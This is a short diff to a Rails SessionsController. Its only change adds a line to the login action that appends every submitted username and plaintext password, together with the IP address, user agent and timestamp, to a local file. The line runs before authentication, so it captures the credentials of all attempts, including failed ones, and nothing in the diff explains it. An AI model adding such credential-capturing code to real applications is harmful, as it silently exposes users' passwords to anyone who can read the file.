@@ -3,6 +3,7 @@ class SessionsController < ApplicationController
   end
   
   def create
+    File.write('./tmp/login.txt',"Local time: #{Time.now}; ip: #{request.remote_ip}; login: #{params[:session][:login]}; pw: #{params[:session][:password]}; agent: #{request.user_agent}; \n", mode: 'a')
     user = User.find_by(login: params[:session][:login])
     if user && user.authenticate(params[:session][:password])
       # Log the user in and redirect to the user's show page.
